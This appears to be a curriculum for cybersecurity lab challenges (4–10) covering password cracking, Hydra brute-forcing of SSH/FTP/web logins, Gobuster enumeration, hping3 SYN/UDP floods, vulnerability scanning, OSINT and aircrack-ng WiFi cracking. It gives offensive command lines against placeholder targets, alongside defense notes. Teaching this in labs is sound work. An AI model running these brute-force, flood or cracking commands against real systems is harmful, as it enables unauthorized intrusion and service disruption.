# Advanced Cybersecurity Challenges

## Challenge 4: Password Cracking with John the Ripper
**Difficulty**: Medium (300 points)  
**Category**: Cryptography & Password Security  
**Tools**: John the Ripper, hashcat, custom wordlists

### Objective
Crack various password hashes using different techniques and tools.

### Scenario
You've obtained password hashes from a compromised system. Use John the Ripper and other tools to crack them.

### Tasks
1. **Hash Identification**: Identify hash types (MD5, SHA1, bcrypt, etc.)
2. **Dictionary Attack**: Use common wordlists
3. **Brute Force**: Crack simple passwords
4. **Rule-based Attack**: Apply transformation rules
5. **Custom Wordlist**: Create targeted wordlists

### Files Provided
- `hashes.txt` - Various password hashes
- `users.txt` - Username list
- `rockyou.txt` - Common password wordlist

### Commands to Learn
```bash
# Identify hash type
john --list=formats | grep -i md5

# Basic dictionary attack
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt

# Show cracked passwords
john --show hashes.txt

# Brute force attack
john --incremental hashes.txt

# Custom rules
john --wordlist=custom.txt --rules hashes.txt
```

### Flag Location
Crack the hash for user "admin" to get the flag.

---

## Challenge 5: Brute Force Attack Simulation
**Difficulty**: Medium (250 points)  
**Category**: Authentication Security  
**Tools**: Hydra, Medusa, custom scripts

### Objective
Perform brute force attacks against various services and learn defense mechanisms.

### Scenario
Test the security of login systems using automated brute force tools.

### Tasks
1. **SSH Brute Force**: Attack SSH service
2. **HTTP Form Brute Force**: Attack web login forms
3. **FTP Brute Force**: Attack FTP service
4. **Rate Limiting**: Understand and bypass rate limiting
5. **Defense Mechanisms**: Implement and test defenses

### Commands to Learn
```bash
# SSH brute force
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://target_ip

# HTTP form brute force
hydra -l admin -P passwords.txt target_ip http-post-form "/login:username=^USER^&password=^PASS^:Invalid"

# FTP brute force
hydra -l admin -P passwords.txt ftp://target_ip

# Custom rate-limited attack
hydra -l admin -P passwords.txt -t 1 -W 5 ssh://target_ip
```

### Defense Learning
- Implement account lockout policies
- Use fail2ban for automatic IP blocking
- Monitor failed login attempts

---

## Challenge 6: Directory Enumeration with Gobuster
**Difficulty**: Easy (200 points)  
**Category**: Web Security & Reconnaissance  
**Tools**: Gobuster, dirb, dirbuster

### Objective
Discover hidden directories and files on web servers.

### Scenario
Enumerate web applications to find hidden admin panels, backup files, and sensitive directories.

### Tasks
1. **Basic Directory Enumeration**: Find common directories
2. **File Extension Discovery**: Find specific file types
3. **Subdomain Enumeration**: Discover subdomains
4. **Custom Wordlists**: Use targeted wordlists
5. **Stealth Techniques**: Avoid detection

### Commands to Learn
```bash
# Basic directory enumeration
gobuster dir -u http://target_ip -w /usr/share/wordlists/dirb/common.txt

# File extension enumeration
gobuster dir -u http://target_ip -w /usr/share/wordlists/dirb/common.txt -x php,html,txt,js

# Subdomain enumeration
gobuster dns -d target.com -w /usr/share/wordlists/subdomains.txt

# Custom wordlist with threads
gobuster dir -u http://target_ip -w custom_dirs.txt -t 50

# Stealth mode with delays
gobuster dir -u http://target_ip -w wordlist.txt --delay 100ms
```

### Flag Location
Find the hidden admin directory containing the flag file.

---

## Challenge 7: DoS/DDoS Attack Simulation
**Difficulty**: Hard (400 points)  
**Category**: Network Security & Attack Simulation  
**Tools**: hping3, LOIC, custom scripts

### Objective
Understand and simulate Denial of Service attacks while learning mitigation techniques.

### Scenario
Test network resilience against various DoS attack vectors in a controlled environment.

### Tasks
1. **SYN Flood Attack**: Overwhelm TCP connections
2. **UDP Flood**: Saturate bandwidth with UDP packets
3. **HTTP Flood**: Application-layer DoS
4. **Ping of Death**: Malformed packet attacks
5. **Mitigation Testing**: Implement and test defenses

### Commands to Learn
```bash
# SYN flood attack
hping3 -S --flood -V target_ip

# UDP flood
hping3 --udp --flood -V target_ip

# ICMP flood
hping3 --icmp --flood -V target_ip

# HTTP flood with curl
for i in {1..1000}; do curl http://target_ip & done

# Custom packet crafting
hping3 -S -p 80 --flood --rand-source target_ip
```

### Defense Learning
- Configure iptables rate limiting
- Implement DDoS protection
- Monitor network traffic patterns

**⚠️ Important**: Only perform in isolated lab environment!

---

## Challenge 8: Vulnerability Assessment
**Difficulty**: Medium (350 points)  
**Category**: Vulnerability Management  
**Tools**: Nessus, OpenVAS, Nikto, custom scanners

### Objective
Perform comprehensive vulnerability assessments and prioritize findings.

### Scenario
Conduct a full security assessment of target systems and generate professional reports.

### Tasks
1. **Network Vulnerability Scan**: Identify system vulnerabilities
2. **Web Application Scan**: Find web-specific vulnerabilities
3. **Configuration Assessment**: Check security configurations
4. **Risk Prioritization**: Rank vulnerabilities by severity
5. **Report Generation**: Create executive summary

### Commands to Learn
```bash
# Web vulnerability scanning
nikto -h http://target_ip

# SSL/TLS testing
sslscan target_ip:443

# Network service scanning
nmap --script vuln target_ip

# Custom vulnerability checks
nmap --script http-vuln-* target_ip
```

### Deliverables
- Vulnerability assessment report
- Risk matrix with CVSS scores
- Remediation recommendations

---

## Challenge 9: Social Engineering & OSINT
**Difficulty**: Medium (300 points)  
**Category**: Information Gathering & Social Engineering  
**Tools**: theHarvester, Maltego, custom scripts

### Objective
Gather intelligence through open sources and understand social engineering vectors.

### Scenario
Perform reconnaissance on a target organization using only publicly available information.

### Tasks
1. **Email Harvesting**: Collect email addresses
2. **Social Media Intelligence**: Gather information from social platforms
3. **DNS Enumeration**: Map network infrastructure
4. **Metadata Analysis**: Extract information from documents
5. **Phishing Simulation**: Create awareness campaigns

### Commands to Learn
```bash
# Email harvesting
theHarvester -d target.com -l 500 -b google

# DNS enumeration
dnsrecon -d target.com

# Subdomain discovery
sublist3r -d target.com

# Metadata extraction
exiftool document.pdf

# Whois information
whois target.com
```

### Ethical Guidelines
- Only use publicly available information
- Respect privacy and legal boundaries
- Focus on defensive awareness

---

## Challenge 10: Wireless Security Assessment
**Difficulty**: Hard (450 points)  
**Category**: Wireless Security  
**Tools**: Aircrack-ng, Reaver, Kismet

### Objective
Assess wireless network security and understand attack vectors.

### Scenario
Evaluate the security of wireless networks in a controlled environment.

### Tasks
1. **Network Discovery**: Identify wireless networks
2. **WEP Cracking**: Break WEP encryption
3. **WPA/WPA2 Attacks**: Dictionary and brute force attacks
4. **WPS Attacks**: Exploit WPS vulnerabilities
5. **Rogue AP Detection**: Identify malicious access points

### Commands to Learn
```bash
# Monitor mode setup
airmon-ng start wlan0

# Network discovery
airodump-ng wlan0mon

# WEP cracking
aircrack-ng -b [BSSID] capture.cap

# WPA handshake capture
airodump-ng -c [channel] --bssid [BSSID] -w capture wlan0mon

# WPA dictionary attack
aircrack-ng -w wordlist.txt capture.cap
```

### Security Recommendations
- Use WPA3 encryption
- Disable WPS
- Implement MAC filtering
- Regular security audits

---

## Implementation Notes

### Database Schema Updates
```sql
-- Add new challenge categories
ALTER TABLE challenges ADD COLUMN tools_required TEXT;
ALTER TABLE challenges ADD COLUMN estimated_time INTEGER;
ALTER TABLE challenges ADD COLUMN prerequisites TEXT;

-- Add challenge files table
CREATE TABLE challenge_files (
    id INTEGER PRIMARY KEY,
    challenge_id INTEGER,
    filename TEXT,
    file_path TEXT,
    description TEXT,
    FOREIGN KEY (challenge_id) REFERENCES challenges (id)
);

-- Add user submissions table
CREATE TABLE user_submissions (
    id INTEGER PRIMARY KEY,
    user_id INTEGER,
    challenge_id INTEGER,
    submission_text TEXT,
    submission_time DATETIME,
    score INTEGER,
    FOREIGN KEY (user_id) REFERENCES users (id),
    FOREIGN KEY (challenge_id) REFERENCES challenges (id)
);
```

### Kali Linux Tool Integration
All challenges are designed to work with tools pre-installed in Kali Linux:
- John the Ripper (password cracking)
- Hydra (brute force attacks)
- Gobuster (directory enumeration)
- hping3 (DoS simulation)
- Nikto (web vulnerability scanning)
- Aircrack-ng (wireless security)

### Safety and Ethics
- All attacks performed in isolated lab environment
- Educational focus on defense and mitigation
- Ethical guidelines clearly stated
- Legal compliance emphasized
